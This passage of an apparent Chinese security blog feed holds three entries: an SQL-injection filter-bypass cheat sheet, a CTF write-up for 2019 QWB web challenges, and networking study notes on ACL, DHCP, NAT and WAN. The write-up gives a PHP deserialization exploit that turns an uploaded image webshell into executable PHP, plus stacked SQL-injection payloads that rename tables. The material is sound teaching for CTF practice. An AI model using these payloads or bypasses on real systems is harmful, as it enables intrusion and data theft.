class="code"><pre><span class="line">//unicode </span><br><span class="line">\u0020 </span><br><span class="line"></span><br><span class="line">//html encode</span><br><span class="line">&amp;#32;</span><br></pre></td></tr></table></figure><h2 id="过滤-union-和-select-等"><a href="#过滤-union-和-select-等" class="headerlink" title="过滤 union 和 select 等"></a>过滤 union 和 select 等</h2><p>1、编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//大小写 </span><br><span class="line">UniON  SelEcT </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line">union = %75%6E%69%6F%6E  </span><br><span class="line">select = %73%65%6C%65%63%74 </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line">union = \u0075\u006e\u0069\u006f\u006e  </span><br><span class="line">select = \u0073\u0065\u006c\u0065\u0063\u0074 </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">union = &amp;#32;&amp;#117;&amp;#110;&amp;#105;&amp;#111;&amp;#110;</span><br><span class="line">select = &amp;#115;&amp;#101;&amp;#108;&amp;#101;&amp;#99;&amp;#116;</span><br></pre></td></tr></table></figure><p>2、重复(只过滤一次时)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ununionion</span><br><span class="line">selselectect</span><br></pre></td></tr></table></figure><p>3、注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/*!union*/ </span><br><span class="line">/*!select*/</span><br></pre></td></tr></table></figure><h2 id="过滤-‘-和"><a href="#过滤-‘-和" class="headerlink" title="过滤 ‘ 和 \"></a>过滤 ‘ 和 \</h2><p>1、宽字节注入</p><p>2、编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//url encode </span><br><span class="line">&apos; = %27 </span><br><span class="line">\ = %5c </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line">&apos; = %27 </span><br><span class="line">\ = %5c </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line">&apos; = \u0027 </span><br><span class="line">\ = \u005c </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">&apos; = &amp;#39;</span><br><span class="line">\ = &amp;#92;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一些问题&quot;&gt;&lt;a href=&quot;#一些问题&quot; class=&quot;headerlink&quot; title=&quot;一些问题&quot;&gt;&lt;/a&gt;一些问题&lt;/h1&gt;&lt;h2 id=&quot;sqli-labs和dvwa&quot;&gt;&lt;a href=&quot;#sqli-labs和dvwa&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>强网杯web复现</title>
    <link href="http://yoursite.com/2019/06/05/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/06/05/2019强网杯web复现/</id>
    <published>2019-06-05T04:17:46.234Z</published>
    <updated>2019-06-11T16:33:05.537Z</updated>
    
    <content type="html"><![CDATA[<p>平台：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><h1 id="UPLOAD"><a href="#UPLOAD" class="headerlink" title="UPLOAD"></a>UPLOAD</h1><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>大佬的 wp : <a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h2><ol><li><p>只能上传正常的图片，非 png 格式会自动转化为 png，图片被保存在 upload 目录下</p></li><li><p>本题是 <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> 泄露，源码泄露总结<a href>点击此处</a></p></li><li><p>函数流程：</p><ol><li>没有登陆时，跳转到 index.php，进行注册登陆。login_check 函数将 cookie(‘user’) 赋给 profile，然后 base64 解码反序列化</li><li>在注册页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行注册</li><li>在登陆页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行登陆</li><li>已经登陆时，跳转到 index.php/home 进行文件上传操作</li><li>在进行上传操作时，对请求头中的 REMOTE_ADDR 进行 md5 加密并赋给 upload_menu ，然后创建以 upload_menu 命名的文件夹</li><li>然后进行登陆检查，然后将文件的临时副本的名称赋给 filename_tmp，将文件名(不加后缀)进行 md5 加密后赋给 filename</li><li>然后进行后缀检测，将 filename 的后缀赋给 ext，如果 ext 为 png 返回 1，否则返回 0</li><li>如果后缀是 png，检查图片内容，然后将 filename 赋给 filename_tmp，将图片相对路径赋给 img，执行 update_img 函数</li><li>update_img 函数先进行 user 查询，如果 user 没有上传过图片并且 img 存在，则更新 user 表的 img 字段，并执行 update_cookie 函数</li><li>update_cookie 函数将上传图片的 img 进行序列化和 base64 编码后赋给 cookie 的 user</li><li>profile 的 _call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。__get 会直接从 except 里找，__call 会调用自身的 name 成员变量所指代的变量所指代的方法。</li></ol></li><li><p>攻击流程：</p><ol><li><p>注册，登陆。登陆之后有个跳转的过程，这里就有了 cookie，如图</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_1.png" alt></p><p>解码后如图</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_2.png" alt></p></li><li><p>选择上传图片，这个图片就是合成的图片马，从 <a href="https://www.iconfont.cn/" target="_blank" rel="noopener">阿里巴巴矢量图库</a> 下载一个 png 图片，然后蚁剑生成一个 shell，用 hex 编辑器直接将 shell 内容放在图片后面即可。这里使用阿里的图库是因为网上的 png 图片可能 hex 格式不规范，导致后面改名之后会报 parse error</p></li><li><p>上传图片之后，会在 upload 目录下生成一个 md5(REMOTE_ADDR) 文件，而且文件名也会被 md5 加密，这时 cookie[‘user’] 如图</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_3.png" alt></p><p>解码后如图</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_4.png" alt></p></li><li><p>使用 poc 生成的序列化结果修改 cookie[‘user’]，刷新一次即可修改后缀。在服务器反序列化的过程中，在 Register 类中执行析构函数，调用 $profile 的 index() 函数，在 Profile 类的 __get 函数中定义了如果调用 index() 就去调用 img，而 __call 函数规定调用不可调用的函数时就调用 img 对应的函数，这样就控制函数跳转到 upload_img 函数，然后执行复制函数，将 png 改为 php，并删除原有的 png，至此，后缀修改完成。</p></li><li><p>最后直接用蚁剑连接 shell，读取配置文件中的数据库信息，选择 mysqli 驱动连接到数据库，即可读取 flag</p></li></ol></li><li><p>最终 poc 如下，修改上传图片地址即可</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$profile = <span class="keyword">new</span> Profile();</span><br><span class="line">$profile-&gt;except = [<span class="string">'index'</span> =&gt; <span class="string">'img'</span>];</span><br><span class="line">$profile-&gt;img = <span class="string">"upload_img"</span>;</span><br><span class="line">$profile-&gt;ext = <span class="string">"png"</span>;</span><br><span class="line"><span class="comment">//修改地址即可</span></span><br><span class="line">$profile-&gt;filename_tmp = <span class="string">"../public/upload/24ff17b3e72d90d210f3455327ea52f7/36a767e7b2d8d3bde3f881217a418ebb5.png"</span>;</span><br><span class="line">$profile-&gt;filename = <span class="string">"../public/upload/24ff17b3e72d90d210f3455327ea52f7/6a767e7b2d8d3bde3f881217a418ebb5.php"</span>;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register();</span><br><span class="line">$register-&gt;registed = <span class="keyword">false</span>;</span><br><span class="line">$register-&gt;checker = $profile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>mysqli 是 PHP 驱动数据库的一种方式，以前是使用 mysql 的，而 mysqli 相比于 mysql 更加安全高效</p><p>copy(a, b)，a 和 b 是文件路径，将文件从 a 拷贝到 b，比如 copy(“./1.png”, “./1.php” ) 执行之后会存在两个文件 1.png 和 1.php</p><p>unlink(a)，a 是文件路径，删除文件 a</p></blockquote><h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><ol><li><p>打开靶机，随便提交，发现似乎是把 PHP 查询的原始结果之间返回了</p></li><li><p>输入 select 发现了过滤语句，过滤了 select，update，delete，drop，insert，where 和 . </p><p><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p></li><li><p>测试一下有没有注入。<code>?inject=1&#39;%23</code>，返回正常，字符型注入</p></li><li><p>过滤了这么多关键词，尝试堆叠注入。<code>?inject=1&#39;;show databases;%23</code>，看到了所有的数据库</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_1.png" alt></p></li><li><p>再看一下所有的表。<code>?inject=1&#39;;show tables;%23</code>，1919810931114514 表和 words 表</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_2.png" alt></p></li><li><p>flag 在全数字的表里，默认查询的是 words 表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show columns from `1919810931114514`;%23</span><br><span class="line">?inject=1&apos;;show columns from `words`;%23</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/6.png" alt></p></li></ol><p>​        <img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/7.png" alt></p><ol start="7"><li><p>既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了</p></li><li><p>构造 payload 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1&apos;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</span><br></pre></td></tr></table></figure></li><li><p>使用  <code>/?inject=1&#39; or &#39;1&#39;=&#39;1</code> 访问一下即可获得 flag</p></li></ol><h2 id="个人总结-1"><a href="#个人总结-1" class="headerlink" title="个人总结"></a>个人总结</h2><ol><li><p>MySQL中反引号和单引号的区别与用法</p><ol><li>MySql 中用一对反引号来标注 SQL 语句中的标识，如<strong>数据库名、表名、字段名</strong>等</li><li>引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即<strong>字段值</strong></li><li>例如：select * from `username` where `name`=”peri0d”</li></ol></li><li><p>PHP 代码推测，这里只是一个大概的流程，和实际可能有出入。参照 sqli-labs 里的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($inject)</span></span>&#123;</span><br><span class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'inject'</span>]))&#123;</span><br><span class="line">$id = $_GET[<span class="string">'inject'</span>];</span><br><span class="line">waf($id);</span><br><span class="line"></span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);</span><br><span class="line">$sql = <span class="string">"select * from `words` where id = '$id';"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))&#123;</span><br><span class="line"><span class="comment">/* store first result set */</span></span><br><span class="line">$result = mysqli_multi_query($con1);</span><br><span class="line"><span class="keyword">if</span> ($result)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>($row = mysqli_fetch_row($result))</span><br><span class="line">&#123;</span><br><span class="line">  var_dump($row);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* print divider */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_more_results($con1))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>MySQL 的 show、rename 和 alter 命令</p><ol><li>show 可以用于查看当前数据库，当前表，以及表中的字段</li><li>rename 用于修改 table 的名称</li><li>alter 用于修改表中字段的属性</li></ol></li><li><p>攻击思路：默认查询 words 表，可以将数字表的名称改成 words，这样就可以 使用 or ‘1’=’1 直接查询 flag 了</p></li></ol><h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;平台：&lt;a href=&quot;https://buuoj.cn/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://buuoj.cn/challenges&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;UPLOAD&quot;&gt;&lt;a href=&quot;#UPL
      
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
      <category term="QWB" scheme="http://yoursite.com/tags/QWB/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络总结(四)</title>
    <link href="http://yoursite.com/2019/06/04/%E7%AD%96%E7%95%A5%E5%8F%8A%E6%9C%8D%E5%8A%A1%E5%92%8C%E5%B9%BF%E5%9F%9F%E7%BD%91/"/>
    <id>http://yoursite.com/2019/06/04/策略及服务和广域网/</id>
    <published>2019-06-04T08:12:52.738Z</published>
    <updated>2019-06-08T08:38:12.216Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h1><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul><li>Access Control List 访问控制列表</li><li>作为过滤器时，应用在接口上的，必须挂在一个接口上</li><li>一般有两个接口，出口和入口，一个接口最多挂 2 个 ACL，一个方向上最多挂一个 ACL</li></ul><h2 id="Why-Use-ACLs"><a href="#Why-Use-ACLs" class="headerlink" title="Why Use ACLs"></a>Why Use ACLs</h2><ul><li>Filtering : Manage IP traffic by filtering packets passing through a router</li><li>Classification : Identify traffic for special handling</li></ul><blockquote><p>用于过滤流量时单独使用，用于分类时配合其他协议或应用使用</p></blockquote><h2 id="Filtering"><a href="#Filtering" class="headerlink" title="Filtering"></a>Filtering</h2><ul><li>Permit or deny packets moving through the router</li><li>Permit or deny vty access to re from the router</li></ul><blockquote><p>一般可以检查到第 4 层，可以理解为一个包过滤防火墙，但不是一个专业的防火墙</p></blockquote><h2 id="Classification"><a href="#Classification" class="headerlink" title="Classification"></a>Classification</h2><ul><li>Special handing for traffic based on packet tests</li></ul><blockquote><p>就是为其他协议提供分类服务，而不丢弃数据包</p></blockquote><h2 id="Outbound-ACL-Operation"><a href="#Outbound-ACL-Operation" class="headerlink" title="Outbound ACL Operation"></a>Outbound ACL Operation</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/27.png" alt></p><blockquote><p>ACL Test：只要匹配一个就立即执行这个条件所规定的动作，不再匹配下面的</p></blockquote><h2 id="Types-of-ACLS"><a href="#Types-of-ACLS" class="headerlink" title="Types of ACLS"></a>Types of ACLS</h2><ul><li>Standard ACL<ul><li>Checks source address</li><li>Generally permits or denies entire protocol suite</li><li>Slow speed</li></ul></li><li>Extended ACL<ul><li>Checks source and destination address</li><li>Generally permits or denies specific protocols and applications</li><li>Fast speed</li></ul></li><li>Identify standard and extended ACLs<ul><li>Use a number</li><li>Use a name</li></ul></li></ul><blockquote><p>Standard : 1-99, 1300-1999</p><p>Extended : 100-199, 2000-2699</p></blockquote><h2 id="Wildcard-Bits-Check-the-corresponding-address-bits"><a href="#Wildcard-Bits-Check-the-corresponding-address-bits" class="headerlink" title="Wildcard Bits : Check the corresponding address bits"></a>Wildcard Bits : Check the corresponding address bits</h2><ul><li>0 代表匹配，1 代表忽略</li><li>Matches all bits : 0.0.0.0</li><li>Ignore all bits : 255.255.255.255</li><li>Example : <ul><li>Address : 172.30.16.0</li><li>Wildcard mask : 0.0.15.255</li><li>前 16 位必须是 170.30，15 表示只检查第三个八位组的前四位，必须和 Address 一样 0001，255 表示第四个八位组不匹配</li></ul></li></ul><h2 id="Testing-Packets-with-Numbered-Extended-ACLs"><a href="#Testing-Packets-with-Numbered-Extended-ACLs" class="headerlink" title="Testing Packets with Numbered Extended ACLs"></a>Testing Packets with Numbered Extended ACLs</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/28.png" alt></p><h1 id="DHCP-Service"><a href="#DHCP-Service" class="headerlink" title="DHCP Service"></a>DHCP Service</h1><h2 id="Features-1"><a href="#Features-1" class="headerlink" title="Features"></a>Features</h2><ul><li>DHCP is built on a client-server model</li><li>Use UDP protocol with port 67,68</li><li>Support <em>automatic allocation</em>, <em>dynamic allocation</em> and <em>manual allocation</em></li></ul><blockquote><p>这是内网服务</p></blockquote><h2 id="DHCP-Process"><a href="#DHCP-Process" class="headerlink" title="DHCP Process"></a>DHCP Process</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/29.png" alt></p><blockquote><p>discover message : 发现 DHCP 服务器，广播发送</p><p>offer message : 包含已分配的 IP 地址，单播发送</p><p>request message : 确认 IP 地址无问题，广播发送( DHCP 服务器不一定是一个，告诉网络中所有的 DHCP 服务器使用哪个 IP 地址 )</p><p>ack message : 确认消息，单播发送</p></blockquote><h1 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h1><h2 id="Network-Address-Translation"><a href="#Network-Address-Translation" class="headerlink" title="Network Address Translation"></a>Network Address Translation</h2><ul><li>网络地址转换，用于修改 IP 数据包中的源、目标地址，比如内网地址转换为外网地址</li><li>为何使用 NAT 技术<ul><li>节省 IP 地址( NAT + VLSM/CIDR )</li><li>可以隐藏内部真实 IP，隐藏了源地址</li><li>NAT TCP 负载均衡</li><li>解决地址冲突问题</li></ul></li></ul><h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><ul><li>影响路由器性能</li><li>破坏了 IP 的端到端特性</li><li>与一些安全协议不兼容</li></ul><h2 id="NAT-分类"><a href="#NAT-分类" class="headerlink" title="NAT 分类"></a>NAT 分类</h2><ul><li>静态 NAT<ul><li>一对一转换</li><li>手工创建 NAT 映射表</li></ul></li><li>动态 NAT<ul><li>一对一转换</li><li>定义地址池，动态创建 NAT 映射表</li></ul></li><li>PAT<ul><li>多对一转换</li><li>通过端口号标识不同数据流</li></ul></li></ul><blockquote><p>一般静态 NAT 和 动态 NAT 用于解决地址冲突，一般 PAT 用于节约 IP 地址</p><p>可以是内网地址转换为外网地址，也可以是外网地址转换为外网地址</p></blockquote><h2 id="PAT"><a href="#PAT" class="headerlink" title="PAT"></a>PAT</h2><ul><li>为每一个数据流分配一个端口号</li><li>出口是同一个出口，通过分配的端口号识别数据流，并且会记录外部地址和外部端口号</li></ul><h1 id="广域网"><a href="#广域网" class="headerlink" title="广域网"></a>广域网</h1><h2 id="WAN"><a href="#WAN" class="headerlink" title="WAN"></a>WAN</h2><h3 id="WANs-vs-LANs"><a href="#WANs-vs-LANs" class="headerlink" title="WANs vs. LANs"></a>WANs vs. LANs</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/30.png" alt></p><h3 id="WAN-Services"><a href="#WAN-Services" class="headerlink" title="WAN Services"></a>WAN Services</h3><ul><li>Physical : Electrical, mechanical, operational connections</li><li>Data Link : Frame Relay, ATM, HDLC</li></ul><blockquote><p>一般广域网只影响 OSI 的后两层，不影响上层</p></blockquote><h3 id="Physical-Layer-WANs"><a href="#Physical-Layer-WANs" class="headerlink" title="Physical Layer: WANs"></a>Physical Layer: WANs</h3><ul><li>底层一般用串行接口,比如 s0/0</li><li>设备分为 DTE 和 DCE，客户端是 DTE 端，DCE 端提供传输所需要的信息</li></ul><h3 id="WAN-Data-Link-Protocols"><a href="#WAN-Data-Link-Protocols" class="headerlink" title="WAN Data-Link Protocols"></a>WAN Data-Link Protocols</h3><ul><li>HDLC</li><li>PPP：ADSL，3G，GPRS，CMDA</li><li>Frame Relay</li><li>ATM</li><li>ISDN</li></ul><h3 id="WAN-Link-Options"><a href="#WAN-Link-Options" class="headerlink" title="WAN Link Options"></a>WAN Link Options</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/31.png" alt></p><h3 id="WAN-分类"><a href="#WAN-分类" class="headerlink" title="WAN 分类"></a>WAN 分类</h3><ul><li>Closed Network<ul><li>专有网络，应用于银行，军队，政府</li></ul></li><li>Open Network<ul><li>开放网络，比如Internet</li></ul></li></ul><blockquote><p>Internet 属于广域网，广域网不仅仅是 Internet</p></blockquote><h2 id="Internet-Connection"><a href="#Internet-Connection" class="headerlink" title="Internet Connection"></a>Internet Connection</h2><h3 id="DSL-Service-Types-Overview"><a href="#DSL-Service-Types-Overview" class="headerlink" title="DSL Service Types Overview"></a>DSL Service Types Overview</h3><ul><li>一般家庭和中小型企业使用 DSL 接入互联网</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/32.png" alt></p><h3 id="ADSL"><a href="#ADSL" class="headerlink" title="ADSL"></a>ADSL</h3><ul><li>上行速率低，下行速率高</li><li>属于一层技术</li><li>可以在传统的电话线上传输</li><li>上层协议为 PPP 协议</li></ul><h2 id="Serial-Encapsulation"><a href="#Serial-Encapsulation" class="headerlink" title="Serial Encapsulation"></a>Serial Encapsulation</h2><h3 id="Typical-WAN-Encapsulation-Protocols"><a href="#Typical-WAN-Encapsulation-Protocols" class="headerlink" title="Typical WAN Encapsulation Protocols"></a>Typical WAN Encapsulation Protocols</h3><ul><li>Leased Line</li><li>Packet Switching</li><li>Circuit Switching</li><li>Metro Ethernet</li><li>Broadband</li></ul><h3 id="Circuit-Switching"><a href="#Circuit-Switching" class="headerlink" title="Circuit Switching"></a>Circuit Switching</h3><ul><li>需要建立连接( 拨号的过程 )，而且建立连接比较慢</li><li>专属线路</li><li>连接速率比较低</li><li>一般基于 PSTN( Public Switched Telephone Network )</li></ul><h3 id="Leased-Line"><a href="#Leased-Line" class="headerlink" title="Leased Line"></a>Leased Line</h3><ul><li>专线，比如光纤</li><li>速度快，连接简单，质量高</li><li>费用高</li></ul><h3 id="Leased-Line-Encapsulation-Protocols"><a href="#Leased-Line-Encapsulation-Protocols" class="headerlink" title="Leased Line Encapsulation Protocols"></a>Leased Line Encapsulation Protocols</h3><ul><li>平常所说的以太网是应用于局域网中，不再适用于广域网</li><li>对于专线连接，二层通常需要一些特殊的协议。二层的封装不再是以太网封装，就没有 MAC 地址了</li><li>一般默认是 HDLC，但是一般厂商都会改装成私有协议，这样就只适用于相同厂商的设备连接</li><li>对于不同厂商的设备连接，一般使用 PPP 协议，它是一个标准协议</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/33.png" alt></p><h3 id="ATM-and-Cell-Switching"><a href="#ATM-and-Cell-Switching" class="headerlink" title="ATM and Cell Switching"></a>ATM and Cell Switching</h3><ul><li>将数据分为 53 字节的定长数据进行处理</li><li>一般数据处理在硬件中完成，速率很快</li><li>通常用于运营商的内部网络</li></ul><h1 id="PPP"><a href="#PPP" class="headerlink" title="PPP"></a>PPP</h1><h3 id="Features-2"><a href="#Features-2" class="headerlink" title="Features"></a>Features</h3><ul><li>它是一个标准协议</li><li>在广域网中应用范围最广的一个二层协议</li><li>分为 NCP 